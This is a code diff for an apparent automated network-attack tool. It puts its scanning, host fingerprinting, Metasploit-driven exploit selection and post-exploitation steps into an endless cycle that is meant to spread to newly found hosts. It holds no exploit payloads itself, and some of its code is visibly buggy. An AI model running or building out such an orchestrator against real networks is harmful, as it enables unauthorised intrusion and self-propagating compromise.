@@ -7,6 +7,7 @@ from record import Record
 from pymongo import MongoClient
 from metasploit.msfrpc import MsfRpcClient
 import json
+import time
 
 def main():
     ### setup
@@ -37,110 +38,116 @@ def main():
     log_file = open("ophio_log.txt", 'a') # TODO proper logging library, use throughout
 
 
+    while True:
+        ### identifier
+        # call scanCurrentNetwork on initial host
+        # log results of scan
+        # identify root node
+        # add host records to database
 
-    ### identifier
-    # call scanCurrentNetwork on initial host
-    # log results of scan
-    # identify root node
-    # add host records to database
+        # can skip if prev cycle identified new hosts
+        if len(enrichQueue) == 0:
+            identifyResults = json.loads(Identifier.scanCurrentNetwork())
+            rootInterfaces = []
+            hostsDiscovered = []
+            for network in identifyResults:
+                rootInterfaces.append(network["network"])
+                for hostIp in network["hosts"]:
+                    hostsDiscovered.append(hostIp)
 
-    identifyResults = json.loads(Identifier.scanCurrentNetwork())
-    rootInterfaces = []
-    hostsDiscovered = []
-    for network in identifyResults:
-        rootInterfaces.append(network["network"])
-        for hostIp in network["hosts"]:
-            if hostIp not in rootInterfaces:
-                hostsDiscovered.append(hostIp)
+        if rootHost == None:
+            rootHost = Record(rootInterfaces, None)
+            rootHost.exploitStatus["statusCode"] = Record.STATUS_SUCCESS
+            rootHost.exploitStatus["exploitUsed"] = "N/A"
+            record = rootHost.toDict()
+            netMapTable.insert(record)
+            rootHost.id = record["_id"]
+            hostCollection.append(rootHost)
+            enrichQueue.append(rootHost)
 
-    rootHost = Record(rootInterfaces, None)
-    rootHost.exploitStatus["statusCode"] = Record.STATUS_SUCCESS
-    rootHost.exploitStatus["exploitUsed"] = "N/A"
-    record = rootHost.toDict()
-    netMapTable.insert(record)
-    rootHost.id = record["_id"]
-    hostCollection.append(rootHost)
-    enrichQueue.append(rootHost)
-
-    for hostIp in hostsDiscovered:
-        hostRecord = Record([hostIp], rootHost.id)
-        record = hostRecord.toDict()
-        netMapTable.insert(record)
-        hostRecord.id = record["_id"]
-        hostCollection.append(hostRecord)
-        enrichQueue.append(hostRecord)
-
-
-
-    ### enricher
-    # call scanHostsForInfo on list of hosts, excluding self
-    # log results of scans
-    # append information to host records in database
-
-    while len(enrichQueue) > 0:
-        hostRecord = enrichQueue.pop()
-        enrichResults = json.loads(Enricher.scanHostForInfo(hostRecord.interfaces))
-        hostRecord.os = enrichResults[0]
-        hostRecord.openPorts = enrichResults[1:]
-        # TODO update hostRecord in netMapTable, filtering by hostRecord.id
-        exploitQueue.append(hostRecord)
+        for hostIp in hostsDiscovered:
+            # TODO check for duplicates
+            hostRecord = Record([hostIp], rootHost.id)
+            record = hostRecord.toDict()
+            netMapTable.insert(record)
+            hostRecord.id = record["_id"]
+            hostCollection.append(hostRecord)
+            enrichQueue.append(hostRecord)
 
 
+        ### enricher
+        # call scanHostsForInfo on list of hosts, excluding self
+        # log results of scans
+        # append information to host records in database
 
-    ### selector/exploiter
-    # call search on enriched host data
-    # attempt exploits in recommended order
-    # log results and update selector after each exploit run
-    # append exploit status (exploit used, MS session) to host records
-
-    while len(exploitQueue) > 0:
-        hostRecord = exploitQueue.pop()
-        hostIp = hostRecord.interfaces[0]
-        hostData = [hostRecord.os, hostRecord.openPorts]
-        exploitOrder = strategy.search(hostData)
-
-        for exploit in exploitOrder:
-            exploitResults = Exploiter.callExploit(msfClient, exploit, hostIp)
-            exploitSuccess = exploitResults["job_id"] != None
-            strategy.update(hostData, exploit, exploitSuccess)
-            if exploitSuccess:
-                break
-
-        if exploitResults["job_id"] == None:
-            hostRecord.exploitStatus["statusCode"] = Record.STATUS_FAILURE
-        else:
-            hostRecord.exploitStatus = {
-                "statusCode": Record.STATUS_SUCCESS,
-                "exploitUsed": exploitResults["uuid"], # TODO nab exploit name too/instead
-                "msSessionId": exploitResults["job_id"]
-            }
-        # TODO update hostRecord in netMapTable
-        postexQueue.append(hostRecord)
+        while len(enrichQueue) > 0:
+            hostRecord = enrichQueue.pop()
+            enrichResults = json.loads(Enricher.scanHostForInfo(hostRecord.interfaces))
+            hostRecord.os = enrichResults[0]
+            hostRecord.openPorts = enrichResults[1:]
+            # TODO update hostRecord in netMapTable, filtering by hostRecord.id
+            exploitQueue.append(hostRecord)
 
 
 
-    ### post-exploits
-    # drop and run identifier on exploited boxes
-    # add new hosts to records + database
-    # enrich and exploit new hosts as usual
-    while len(postexQueue) > 0:
-        hostRecord = postexQueue.pop()
-        print(hostRecord)
+        ### selector/exploiter
+        # call search on enriched host data
+        # attempt exploits in recommended order
+        # log results and update selector after each exploit run
+        # append exploit status (exploit used, MS session) to host records
+
+        while len(exploitQueue) > 0:
+            hostRecord = exploitQueue.pop()
+            hostIp = hostRecord.interfaces[0]
+            hostData = hostRecord.openPorts.insert(0, hostRecord.os) # ensure this isn't modifying the record
+            exploitOrder = strategy.search(hostData)
+
+            for exploit in exploitOrder:
+                exploitResults = Exploiter.callExploit(msfClient, exploit, hostIp)
+                exploitSuccess = exploitResults["job_id"] != None
+                strategy.update(hostData, exploit, exploitSuccess)
+                if exploitSuccess:
+                    break
+
+            if exploitResults["job_id"] == None:
+                hostRecord.exploitStatus["statusCode"] = Record.STATUS_FAILURE
+            else:
+                hostRecord.exploitStatus = {
+                    "statusCode": Record.STATUS_SUCCESS,
+                    "exploitUsed": exploitResults["uuid"], # TODO nab exploit name too/instead
+                    "msSessionId": exploitResults["job_id"]
+                }
+            # TODO update hostRecord in netMapTable
+            postexQueue.append(hostRecord)
 
 
 
-    ### repetition
-    # each host should be identified, enriched, exploited, and scanned from:
-    # a) seperate queues for each stage, evaluated independently
-    # b) single queue, each host evaluated straight through
-    #
-    # identifiers should be rerun periodically to identify new hosts
-    #
-    # alternative: run once, and restore state from DB info on startup
+        ### post-exploits
+        # drop and run identifier on exploited boxes
+        # add new hosts to records + database
+        # enrich and exploit new hosts as usual
+        while len(postexQueue) > 0:
+            hostRecord = postexQueue.pop()
+            print(hostRecord)
+            # TODO modify networking as needed
+            # TODO scan for new hosts
+            # add results to
 
-    ### logging and reporting
-    # writing activities to a log file from lifecycle is a decent start
-    # function (seperate script?) to produce report on network map & status from memory state or db records
+
+
+        ### repetition
+        # identifiers should be rerun periodically to identify new hosts
+        # alternative: run once, and restore state from DB info on startup
+        print("Reached end of cycle.")
+        if enrichQueue.isEmpty():
+            print("Nothing new to scan. Sleeping.")
+            time.sleep(60)
+
+
+
+        ### logging and reporting
+        # writing activities to a log file from lifecycle is a decent start
+        # function (seperate script?) to produce report on network map & status from memory state or db records
 
 if __name__ == '__main__':
     main()
